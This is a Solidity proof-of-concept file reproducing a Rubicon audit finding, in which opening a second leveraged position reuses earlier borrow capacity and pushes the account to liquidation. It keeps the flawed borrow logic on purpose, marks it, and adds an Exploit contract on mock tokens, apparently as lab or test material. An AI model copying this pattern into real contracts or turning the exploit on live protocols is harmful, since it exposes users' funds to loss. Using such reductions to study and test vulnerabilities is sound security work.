// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Rubicon — [H-13] Opening a position reuses prior collateral borrow capacity
    (Code4rena 2023-04-rubicon; #48952)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: openPosition borrow budget uses _maxBorrow() which includes
    residual capacity from PREVIOUS positions on the same Position contract.
    A second open can push the shared account to the liquidation threshold even
    though each open alone would leave a healthy buffer.
    Vulnerable residual-_max inclusion preserved with @> VULN markers. */

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amt) external {
        totalSupply += amt;
        balanceOf[to] += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Minimal market: CF=0.7, 1:1 oracle, single asset.
contract BathToken {
    MockERC20 public underlying;
    uint256 public constant CF = 7e17;
    uint256 public constant WAD = 1e18;

    mapping(address => uint256) public collat;
    mapping(address => uint256) public debt;

    constructor(MockERC20 u) {
        underlying = u;
    }

    function balanceOf(address a) external view returns (uint256) {
        return collat[a];
    }

    function supply(uint256 amt) external {
        underlying.transferFrom(msg.sender, address(this), amt);
        collat[msg.sender] += amt;
    }

    function borrow(uint256 amt) external {
        require(amt <= maxBorrow(msg.sender), "insufficient liquidity");
        debt[msg.sender] += amt;
        underlying.transfer(msg.sender, amt);
    }

    function maxBorrow(address a) public view returns (uint256) {
        uint256 maxDebt = (collat[a] * CF) / WAD;
        if (maxDebt <= debt[a]) return 0;
        return maxDebt - debt[a];
    }

    function liquidity(address a) external view returns (uint256) {
        uint256 maxDebt = (collat[a] * CF) / WAD;
        if (maxDebt <= debt[a]) return 0;
        return maxDebt - debt[a];
    }
}

/// @dev Reduced Position that reuses prior residual borrow capacity.
contract Position {
    uint256 public constant WAD = 1e18;
    uint256 public constant CF = 7e17;

    BathToken public bath;
    MockERC20 public asset;

    constructor(BathToken b, MockERC20 a) {
        bath = b;
        asset = a;
    }

    function wmul(uint256 x, uint256 y) internal pure returns (uint256) {
        return (x * y) / WAD;
    }

    /// @notice Open leveraged position; borrow budget includes prior residual maxBorrow.
    function openPosition(uint256 initMargin, uint256 leverage) external {
        asset.transferFrom(msg.sender, address(this), initMargin);
        asset.approve(address(bath), type(uint256).max);

        // How much extra asset this open wants via borrowing
        uint256 desiredExtra = wmul(initMargin, leverage) - initMargin;

        bath.supply(initMargin);

        // Room from THIS margin alone
        uint256 thisRoom = wmul(initMargin, CF);

        // @> VULN: use protocol maxBorrow which includes residual capacity from prior positions
        uint256 maxB = bath.maxBorrow(address(this)); // @> VULN: prior residual included
        // FIX: cap borrow budget to thisRoom only (do not consume prior residual for a new open).

        uint256 toBorrow = desiredExtra < maxB ? desiredExtra : maxB;
        // (with fix, would be: desiredExtra < thisRoom ? desiredExtra : thisRoom)
        thisRoom; // referenced for clarity / fix comment

        if (toBorrow > 0) {
            bath.borrow(toBorrow);
        }
    }
}

contract Exploit {
    MockERC20 public asset; // CREATE 1
    BathToken public bath; // CREATE 2
    Position public position; // CREATE 3 — vulnerable

    uint256 public liquidityAfterFirst;
    uint256 public liquidityAfterSecond;

    constructor() {
        asset = new MockERC20("WBTC", "WBTC");
        bath = new BathToken(asset);
        position = new Position(bath, asset);

        // Seed borrow cash (other lenders)
        asset.mint(address(this), 10e18);
        asset.approve(address(bath), 10e18);
        bath.supply(10e18);

        // User funds for two opens
        asset.mint(address(this), 2e18);
    }

    function run() external {
        asset.approve(address(position), type(uint256).max);

        // First: 1e18 @ 1.6x → borrow 0.6; buffer = 0.7 - 0.6 = 0.1
        position.openPosition(1e18, 16e17);
        liquidityAfterFirst = bath.liquidity(address(position));
        require(liquidityAfterFirst == 1e17, "first buffer 0.1e18");
        require(bath.debt(address(position)) == 6e17, "debt 0.6");

        // Second: 1e18 @ 1.8x → wants borrow 0.8.
        // After supply: collat=2, debt=0.6, maxB=0.8.
        // Bug uses maxB=0.8 (includes 0.1 residual) → borrows 0.8 → debt=1.4, max=1.4, liq=0.
        // Fixed (thisRoom only=0.7) would leave liq=0.1.
        position.openPosition(1e18, 18e17);
        liquidityAfterSecond = bath.liquidity(address(position));

        require(liquidityAfterSecond == 0, "at liquidation threshold");
        require(bath.debt(address(position)) == 14e17, "debt 1.4e18");
        require(bath.balanceOf(address(position)) == 2e18, "collat 2e18");
    }
}
